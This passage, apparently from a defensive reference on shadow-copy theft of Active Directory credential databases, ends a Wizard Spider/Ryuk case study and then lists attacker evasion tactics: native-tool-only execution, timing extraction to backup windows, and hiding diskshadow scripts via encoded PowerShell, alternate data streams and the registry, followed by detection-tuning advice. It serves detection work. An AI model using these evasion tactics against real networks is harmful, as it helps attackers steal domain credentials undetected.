- **Target:** US healthcare organizations
- **Timeline:** 2019-2021
- **Technique Status:** Wizard Spider used VSS-based NTDS extraction followed by Golden Ticket creation and Ryuk deployment
- **Impact:** $1.1B in ransomware payments; hospital networks disrupted
- **Reference:** [MITRE ATT&CK - Wizard Spider](https://attack.mitre.org/groups/G0102/)

---

## 18. SIGNATURE DETECTION EVASION

### Detection Evasion Techniques

**1. Living-Off-The-Land Only:**
- Use only native Windows tools (vssadmin, diskshadow, esentutl)
- No external binaries or scripts (minimal AV/EDR triggering)
- Blend with normal backup activity

**2. Timing:**
- Execute during backup maintenance windows
- Hide among legitimate VSS operations
- Distribute extraction across multiple sessions

**3. Diskshadow Advantages:**
- Less commonly monitored than vssadmin
- Scriptable without process execution for each step
- Reduced command-line artifacts

**4. Obfuscation:**
- PowerShell encoding for commands
- Alternate data streams for scripts
- Registry storage of diskshadow commands

### Recommended Detection Tuning

- **Baseline VSS activity:** Document normal backup-related VSS ops
- **Whitelist legitimate tools:** Exclude backup software VSS usage
- **Alert thresholds:** Distinguish one-off admin tasks from attack patterns
- **Correlation:** Alert only when VSS + NTDS access + exfiltration in same session

---
